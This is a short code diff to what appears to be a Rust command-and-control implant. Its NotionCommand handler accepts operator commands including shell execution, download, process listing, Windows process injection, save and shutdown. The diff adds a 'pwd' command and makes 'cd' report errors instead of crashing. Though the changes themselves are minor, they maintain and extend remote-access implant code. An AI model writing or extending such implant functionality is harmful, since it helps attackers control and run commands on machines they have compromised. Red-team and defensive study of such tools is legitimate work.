@@ -19,6 +19,7 @@ pub enum CommandType {
     Shell(String),
     Download(String),
     Ps,
+    Pwd,
     Inject(String),
     Save(String),
     Shutdown,
@@ -57,6 +58,7 @@ impl NotionCommand {
                 "cd"       => CommandType::Cd(command_string),
                 "download" => CommandType::Download(command_string),
                 "ps"       => CommandType::Ps,
+                "pwd"      => CommandType::Pwd,
                 "inject"   => CommandType::Inject(command_string),
                 "save"     => CommandType::Save(command_string),
                 "shutdown" => CommandType::Shutdown,
@@ -72,14 +74,11 @@ impl NotionCommand {
     pub async fn handle(&self, config_options: &mut ConfigOptions) -> Result<String, Box <dyn Error>> {
         match &self.commmand_type {
             CommandType::Cd(s) => {
-                let new_path = Path::new(&s);
-                set_current_dir(new_path).unwrap();
-
-                return Ok(
-                    String::from(current_dir()?
-                    .to_str()
-                    .unwrap())
-                );
+                let new_path = Path::new(s.trim());
+                match set_current_dir(new_path) {
+                    Ok(_) => Ok(format!("Changed to {s}").to_string()),
+                    Err(e) => Ok(e.to_string())
+                }
             },
             CommandType::Shell(s) => {
                 let output = if cfg!(target_os = "windows") {
@@ -143,6 +142,12 @@ impl NotionCommand {
                     output_string = String::from_utf8(output.stdout).unwrap();
                 }
                 return Ok(output_string);
+            },
+            CommandType::Pwd => {
+                match current_dir() {
+                    Ok(b) => Ok(String::from(b.to_str().unwrap())),
+                    Err(e) => Ok(format!("{e}").to_string())
+                }
             },
             #[cfg(windows)]
             CommandType::Inject(s) => {
